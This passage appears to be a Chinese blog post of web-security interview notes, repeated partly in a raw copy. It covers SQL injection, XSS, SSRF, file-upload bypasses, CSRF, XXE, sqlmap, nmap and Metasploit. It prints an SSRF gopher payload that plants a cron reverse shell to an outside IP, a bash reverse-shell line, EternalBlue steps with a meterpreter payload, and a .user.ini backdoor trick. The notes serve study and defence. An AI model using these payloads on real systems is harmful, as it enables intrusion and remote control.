.user.ini\n\nphp.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。\n\n```\nauto_prepend_file = <filename>         //包含在文件头\nauto_append_file = <filename>          //包含在文件尾\n```\n\n于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马\n\n##### 前端js绕过\n\n抓包直接修改\n\n##### 黑白名单绕过可以上传\n\nphtml php3 php4 php5 Php php (空格) php.，pphphp\n\n##### 修改content-type,添加GIF89a头\n\n\n\n### csrf\n\n#### 原理\n\n攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。\n\n攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户\n\n\n\n#### 防御\n\n（1）避免在URL中明文显示特定操作的参数内容；\n\n（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）\n\n（3）检查Referer Header，拒绝来自非本网站的直接URL请求。\n\n（4）不要在客户端保存敏感信息（比如身份认证信息）；\n\n（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；\n\n（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；\n\n（7）敏感信息的修改使用post而不是get\n\n（8）避免交叉漏洞， 如XSS等\n\n（9）禁止跨域访问\n\n（10）在响应中设置CSP（Content-Security-Policy）内容安全策略\n\n\n\n#### XXE\n\nXXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时\n\n服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理\n\n导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。\n\n\n\n### sqlmap\n\n#### 常用指令\n\n-h                                           显示基本帮助信息\n\n-hh                                         显示高级帮助信息\n\n--version                                显示版本号\n\n-v                                           详细等级（0-6 默认 1）\n-u                                          指定目标url\n\n-d                                          直接连接数据库\n\n-l                                           从burp代理日志的解析目标\n\n-r                                           从文件中加载http请求\n\n-g                                          从google dork的结果作为目标url\n\n-c                                          从INI配置文件中加载选项\n\n1.    --purge      【重新扫描（--purge 删除原先对该目标扫描的记录）\n\n2.    --tables      【获取表名\n\n3.    --dbs         【检测站点包含哪些数据库\n\n4.    --current-db    【获取当前的数据库名\n\n5.    --current-user  【检测当前用户\n\n6.    --is-dba   【判断站点的当前用户是否为数据库管理员\n\n7.    --batch      【默认确认，不询问你是否输入\n\n8.    --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）\n\n9.    --threads 10  【线程，sqlmap线程最高设置为10\n\n10.    --level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头\n                                  的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5\n11.    --risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全\n\n12.    -v   【详细的等级(0-6)\n         0：只显示Python的回溯，错误和关键消息。\n         1：显示信息和警告消息。\n         2：显示调试消息。\n         3：有效载荷注入。\n         4：显示HTTP请求。\n         5：显示HTTP响应头。\n         6：显示HTTP响应页面的内容\n\n13.    --privileges  【查看权限\n\n14.    --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件\n\n15.    --method \"POST\" --data \"page=1&id=2\"   【POST方式提交数据\n\n16.    --threads number　　【采用多线程 后接线程数\n\n17.    --referer  \"\"  【使用referer欺骗\n\n18.    --user-agent \"\"     【自定义user-agent\n\n19.    --proxy “目标地址″   【使用代理注入\n\n1.指定目标url\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.从文件中获取多个url\n\n```\nsqlmap -m 1.txt\n```\n\n3.从文件中加载HTTP请求\n\n```\nsqlmap -r  url.txt\n```\n\n4.利用google获取目标\n\n```\nsqlmap -g \"inurl:\\\".php?id=1\\\"\"\n```\n\n5.从burp日志中获取目标\n\n```\nsqlmap -l    burp.txt\n```\n\n实例演示-sqlmap注入检测\n\n1.GET参数注入\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.POST参数注入\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1\"  --data=\"id=1\"\n```\n\n\n\n1.   sqlmap -u  \"http://www.xx.com?id=x\"    【查询是否存在注入点\n\n2.   --dbs         【检测站点包含哪些数据库\n\n3.   --current-db    【获取当前的数据库名\n\n4.   --tables -D \"db_name\"  【获取指定数据库中的表名 -D后接指定的数据库名称\n\n5.   --columns  -T \"table_name\" -D \"db_name\"  【获取数据库表中的字段\n\n6.   --dump -C \"columns_name\" -T \"table_name\" -D \"db_name\"  【获取字段的数据内容\n\nPOST注入：\n\n    （1）目标地址http:// www.xxx.com /login.asp\n    （2）打开brup代理。\n    （3）点击表单提交\n    （4）burp获取拦截信息（post）\n    （5）右键保存文件（.txt）到指定目录下\n    （6）运行sqlmap并执行如下命令：\n\n用例：sqlmap -r okay.txt  -p  username\n\n// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）\n\n\n\n### AWVS\n\n#### 介绍\n\nAcunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP/HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。\n\nAWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。\n\n\n\n#### 功能特点\n\n- 自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试\n\n- 业内最先进且深入的SQL注入和跨站脚本测试\n\n- 高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer\n\n- 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域\n\n- 支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制\n\n- 丰富的报告功能，包括VISA PCI依从性报告\n\n- 高速的多线程扫描器轻松检索成千上万的页面\n\n- 智能爬行程序检测web服务器类型和应用程序语言\n\n- Acunetix检索并分析网站，包括flash内容，SOAP和AJAX\n\n- 端口扫描web服务器并对在服务器上运行的网络服务执行安全检查\n\n- 可到处网站漏洞文件\n\n\n\n#### 工作原理\n\n- 扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。\n\n- 在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。\n\n- 在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。\n\n- 在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。\n\n\n\n#### 页面介绍\n\n主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。\n\n- Dashboard：仪表盘，显示扫描过的网站的漏洞信息\n- Targets：目标网站，需要被扫描的网站\n- Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞\n- Scans：扫描目标站点，从Target里面选择目标站点进行扫描\n- Reports：漏洞扫描完成后生成的报告\n\n设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings\n\n- Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置\n- Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描\n- Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议\n- Issue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等\n- Email Settings：邮件设置，配置邮件发送信息\n- Engines：引擎，引擎安装删除禁用设置\n- Excluded Hours：扫描时间设置，可设置空闲时间扫描\n- Proxy Settings：代理设置，设置代理服务器信息\n\n\n\n### APPSCAN\n\n#### 介绍\n\nAppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。\n\n#### 工作原理\n\n1）通过探索了解整个web页面结果\n\n2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试\n\n3）分析 Response 来验证是否存在安全漏洞\n\n\n\n### wireshark\n\n#### 软件功能\n\n1、分析网络底层协议；\n 2、解决网络故障问题；\n 3、找寻网络安全问题；\n\n#### 软件原理\n\n当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。`将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。`嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域\n\n\n\n#### 过滤\n\n#### 协议过滤\n\ntcp，只显示TCP协议的数据包列表\n http，只查看HTTP协议的数据包列表\n icmp，只显示ICMP协议的数据包列表\n\n####  ip过滤\n\n```\n ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表\n ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表\n ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表\n```\n\n#### 端口过滤\n\n```\ntcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。\ntcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。\ntcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。\n```\n\n####  Http模式过滤\n\n```\nhttp.request.method==“GET”, 只显示HTTP GET方法的\n```\n\n#### 逻辑运算符为 and/or/not\n\n过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：`ip.addr == 192.168.1.104 and icmp`\n\n\n\n### nmap\n\n| 参数(注意区分大小写) | 说明                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| -sT                  | TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。 |\n| -sS                  | 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。 |\n| -sF  -sN             | 秘密FIN数据包扫描、Xmas Tree、Null扫描模式                   |\n| -sP                  | ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。 |\n| -sU                  | UDP扫描，但UDP扫描是不可靠的                                 |\n| -sA                  | 这项高级的扫描方法通常用来穿过防火墙的规则集                 |\n| -sV                  | 探测端口服务版本                                             |\n| -Pn                  | 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描 |\n| -v                   | 显示扫描过程，推荐使用                                       |\n| -h                   | 帮助选项，是最清楚的帮助文档                                 |\n| -p                   | 指定端口，如“1-65535、1433、135、22、80”等                   |\n| -O                   | 启用远程操作系统检测，存在误报                               |\n| -A                   | 全面系统检测、启用脚本检测、扫描等                           |\n| -oN/-oX/-oG          | 将报告写入文件，分别是正常、XML、grepable 三种格式           |\n| -T4                  | 针对TCP端口禁止动态扫描延迟超过10ms                          |\n| -iL                  | 读取主机列表，例如，“-iL C:\\ip.txt”                          |\n\n**1、扫描单个目标**\n\nnmap ip\n\n```\n如：nmap 192.168.0.101\n```\n\n**2、扫描多个目标**\n\nnmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。\n\n```\n如：nmap 192.168.0.101 192.168.0.110\n```\n\n**3、扫描一个范围内的目标**\n\nnmap xxx.xxx.xxx.xxx-xxx\n\n```\n如：nmap 192.168.0.100-110\n```\n\n**4、扫描目标地址所在某网段**\n\nnamp xxx.xxx.xxx.xxx/xx\n\n```\n如：nmap 192.168.0.1/24\n```\n\n**5、扫描包含主机列表的文件中的所有地址**\n\nnmap -iL <File path>\n\n```\n如：nmap -iL /root/target.txt\n```\n\n**6、扫描除了一个目标地址之外的所有地址**\n\nnmap ip段 -exclude 被排除的ip\n\n```\n如：nmap 192.168.0.100-110 -exclude 192.168.0.103\n   nmap 192.168.0.1/24 -exclude 192.168.0.103 \n```\n\n**7、扫描目标地址的指定端口**\n\nnmap ip -p 端口1，端口2，端口3……\n\n```\n如:nmap 192.168.0.101 -p 80,8080,3306,3389\n```\n\n**8、扫描目标地址C段的在线主机**\n\nnmap -sP ip段\n\n```\n如：nmap -sP 192.168.0.1/24\n```\n\n**9、扫描目标地址操作系统版本进行探测**\n\nnmap -O ip\n\n```\n如：nmap -O 192.168.0.101\n```\n\n**10、扫描目标所开放的全部端口（半开式）**\n\nnmap -sS -p 端口号(多个用“,”隔开) -v ip\n\n```\n如：nmap -sS -p 1-65535 192.168.0.101\n```\n\n\n\n### MSF\n\n#### 简介\n\nMetasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。\n\n\n\n它本身附带数百个已知软件漏洞，**是一款专业级漏洞攻击工具**\n\n\n\n#### 使用\n\n根据漏洞名称搜索 : `search ms17_010`\n\n1、运用辅助模块扫描目标\n\n设置模块：`use auxiliary/scanner/smb/smb_ms17_010`\n\n查看设置：`options` \n\n设置目标地址：`set rhosts 192.168.174.129`\n\n目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，`set rport 目标端口`\n\n设置好了之后，`run`或者`exploit` 进行攻击\n\n\n\n2、设置攻击模块对目标进行攻击\n\n\n\n使用攻击模块：`use exploit/windows/smb/ms17_010_eternalblue`\n\n查看所需设置：`options` \n\n设置目标地址：`set RHOSTS 192.168.174.129`\n\n设置目标端口：`set RPORT 445`\n\n设置payload：`set payload windows/x64/meterpreter/reverse_tcp`\n\n设置本地地址：`set LHOST 192.168.174.192`\n\n攻击：`run`或者`exploit` \n\n\n\n\n\n### Linux命令\n\n**命令：netstat**\n\n用途：查看系统的网络连接状态、路由表、接口统计等信息\n\n格式：netstat [选项]\n\n常用选项：\n\n- -a：显示所有活动连接\n- -n：以数字形式显示\n- -p：显示进程信息\n- -t：查看TCP协议相关信息\n- -u：查看UDP协议相关信息\n- -r：显示路由表信息\n\n\n\n**命令：network**\n\n用途：启用、禁用网络接口配置\n\n重启network格式：service network restart\n\n\n\n**命令：chmod**\n\n用途：权限控制命令\n\nLinux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：\n\n- – 普通文件\n- d 目录\n- s socket套接字\n- l 软链接\n- p 管道\n- c 字符设备\n- b 块设备\n\n`uname -a`: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)\n\n存放系统信息的文件\n\n- cat /etc/issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)\n- cat /etc/*-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符*来解决这个问题。ls /etc | grep \"release\"\"可以使用此命令来查看你系统中此文件夹具体有哪些!)\n- cat /proc/version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。\n- cat /proc/sys/kernel/version: 系统内核信息,相当uname -v(/proc/sys/kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)\n\n\n\n\n进程信息\n\n    ps: 列出本用户当前使用的终端中运行的进程\n        ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)\n        ps aux: 已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程\n    top: 类似Windows的任务管理器\n\n`cat /etc/passwd`: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息\n\n`cat /etc/shadow`: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!\n\n`cat /etc/sudoers`: 对权限的分配管理   \n\n`ifconfig -a`: 查看网络、网卡相关信息\n\n`hostname`: 显示、设置系统的主机名称\n\n\n\n#### 反弹shell\n\n```\nbash -i >& /dev/tcp/192.168.0.4/7777 0>&1\n```\n\n\n\n### OSI模型\n\n![图片-1685330434325](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png)**应用层：为应用程序或用户请求提供各种请求服务。**OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。\n\n**表示层：数据编码、格式转换、数据加密。**提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。\n\n**会话层：创建、管理和维护会话。**接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。\n\n**传输层：数据通信。**建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。\n\n**网络层：IP选址及路由选择。**通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。\n\n**数据链路层：提供介质访问和链路管理。**接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。\n\n**物理层：管理通信设备和网络媒体之间的互联互通。**传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。\n\n\n\n### TCP/IP五层模型\n\n#### ![图片-1685330444867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png)区别\n\nTCP/IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。\n\nTCP/IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。\n\nTCP/IP协议还提供一项名为UDP（用户数据报协议）的选择。\n\n\n\n\n\n### xss，csrf，ssrf区别\n\n**相同点：**\n XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。\n\n**不同点：**\n XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。\n\nCSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  \n\nSSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器","source":"_posts/面试prepare.md","raw":"---\ntitle: 面试prepare\ndate: 2023-04-06 23:33:41\nexcerpt: 面试prepare\ncategories: 学习\n---\n\n\n\n# 面试prepare\n\n### 前言\n\n本人最近准备找一份暑期实习，于是自己写了一份面经\n\n写的不好，仅供参考\n\n\n\n### sql注入\n\n#### **常见的关系型数据库**\n\nmysql、sqlserver、oracle、access、sqlite、postgreSQL\n\n- mysql:3306 \n- sqlserver:1433 \n- orecal:1521 \n- PostgreSQL:5432 \n- db2:50000\n\n- MongoDB:27017 \n- redis:6379 \n- memcached:11211\n\n#### **SQL注入有哪几种注入类型？**\n\n从注入参数类型分：数字型注入、字符型注入、搜索型注入 \n从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，\n\n二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）\n\n从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入\n\n\n\n#### **SQL注入的危害及防御**\n\n危害\n\n- 数据库泄露 \n- 数据库被破坏 \n- 网站崩溃 \n- 服务器被植入木马\n\n\n\n防御\n\n- 代码层面对查询参数进行转义 \n- 预编译与参数绑定 \n- 利用WAF防御\n\n\n\n#### sql注入getshell\n\n- 存在SQL注入漏洞\n- web目录具有写入权限\n- 找到网站的绝对路径\n- secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）\n\n\n\n#### 绕过方式\n\n- 大小写\n- 双写\n- 注释符  /**/\n- 编码绕过 %20 %09 %0a\n- 括号绕过\n- 将表明转为十六进制绕过引号\n- join绕过逗号\n- like绕过等于号\n\n\n\n### xss\n\n#### 原理\n\nxss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功\n\n#### 如何验证存在xss漏洞\n\n第一步，寻找用户可控的参数（输入点）\n 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理\n 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过\n\n\n\n#### xss有哪几种类型\n\n##### DOM型XSS\n\n攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。\n\n##### 反射性型XSS\n\n攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。\n\n##### 存储型XSS\n\n攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。\n\n#### xss危害\n\n- 盗用用户的COOKIE\n- 修改DOM\n- 插入广告（黑页等）\n- 发动xss蠕虫攻击\n- 劫持用户行为，进一步渗透内网\n\n#### xss修复\n\n- 在服务端进行输入检测，过滤特殊字符\n- 对输出内容进行编码转义\n- 在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。\n- 设置httponly为true\n\n\n\n#### 绕过\n\n- 双写\n\n- 对不能构造script标签的情况下\n  使用事件进行绕过\n\n  ```\n  <input  value='123' onclick='alert()'>\n  ```\n\n- 超链接绕过\n\n  ```\n  <a src=javascript:alert()>123</a>\n  ```\n\n  \n\n### ssrf\n\n#### 原理\n\n服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n\n#### 危害\n\nSSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n\n\n\n#### 利用方式\n\nSSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。\n\n以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：\n\n```\ncurl -vvv 'dict://127.0.0.1:6379/info'\n \ncurl -vvv 'file:///etc/passwd'\n \n# * 注意: 链接使用单引号，避免$变量问题\n \ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n```\n\n\n\n#### 绕过\n\n采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成\n\n> - 8进制格式：0300.0250.0.1\n>\n> - 16进制格式：0xC0.0xA8.0.1\n>\n> - 10进制整数格式：3232235521\n>\n> - 16进制整数格式：0xC0A80001\n>\n> - 合并后两位：1.1.278 / 1.1.755\n>\n> - 合并后三位：1.278 / 1.755 / 3.14159267\n>\n> - 0.0.0.0这个IP可以直接访问到本地\n>\n> - `xip.io` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，\n>\n>   例如192.168.0.1.xip.io，解析到192.168.0.1。\n\n\n\n#### 防御方式\n\n> - 过滤返回的信息\n> - 统一错误信息\n> - 限制请求的端口\n> - 禁止不常用的协议\n> - 对DNS Rebinding，考虑使用DNS缓存或者Host白名单\n\n1. 限制访问方法只能使用GET\n2. 限制访问的协议只能是http或https，其他协议直接拒绝访问\n3. 检测特殊字符CRLF，存在则直接拒绝访问\n4. 设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验\n5. 解析url中域名对应的ipv4地址：   \n   1. 该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤\n   2. **使用ip对url中的域名进行替换，访问资源时都以ip进行访问**；这样可以防御DNS Rebinding类的攻击\n\n\n\n### 文件上传\n\n#### 基本概念\n\n用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。\n\n    常见的安全问题：\n    （1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。\n    （2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。\n    （3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。\n\n\n![图片-1685330394483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png)\n\n\n\n#### 文件上传漏洞方式\n\n1.客户端方式\n\n主要方式就是JS检查。\n绕过：\n（1）首先选择正常的文件进行上传\n（2）用BurpSuit进行抓包修改后缀然后完成文件上传.\n2.绕过文件上传检查功能\n（1）白名单校对——%00截断\n\n因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。\n原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。\n\n\n\n#### 绕过\n\n##### .htaccess文件\n\n> htaccess 在站点的根目录下面，不是在[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)目录下，但是它属于apache的一个配置文件\n\n其中.htaccess文件内容：SetHandler application/x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错\n\n\n\n##### .user.ini\n\nphp.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。\n\n```\nauto_prepend_file = <filename>         //包含在文件头\nauto_append_file = <filename>          //包含在文件尾\n```\n\n于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马\n\n##### 前端js绕过\n\n抓包直接修改\n\n##### 黑白名单绕过可以上传\n\nphtml php3 php4 php5 Php php (空格) php.，pphphp\n\n##### 修改content-type,添加GIF89a头\n\n\n\n### csrf\n\n#### 原理\n\n攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。\n\n攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户\n\n\n\n#### 防御\n\n（1）避免在URL中明文显示特定操作的参数内容；\n\n（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）\n\n（3）检查Referer Header，拒绝来自非本网站的直接URL请求。\n\n（4）不要在客户端保存敏感信息（比如身份认证信息）；\n\n（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；\n\n（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；\n\n（7）敏感信息的修改使用post而不是get\n\n（8）避免交叉漏洞， 如XSS等\n\n（9）禁止跨域访问\n\n（10）在响应中设置CSP（Content-Security-Policy）内容安全策略\n\n\n\n#### XXE\n\nXXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时\n\n服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理\n\n导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。\n\n\n\n### sqlmap\n\n#### 常用指令\n\n-h                                           显示基本帮助信息\n\n-hh                                         显示高级帮助信息\n\n--version                                显示版本号\n\n-v                                           详细等级（0-6 默认 1）\n-u                                          指定目标url\n\n-d                                          直接连接数据库\n\n-l                                           从burp代理日志的解析目标\n\n-r                                           从文件中加载http请求\n\n-g                                          从google dork的结果作为目标url\n\n-c                                          从INI配置文件中加载选项\n\n1.    --purge      【重新扫描（--purge 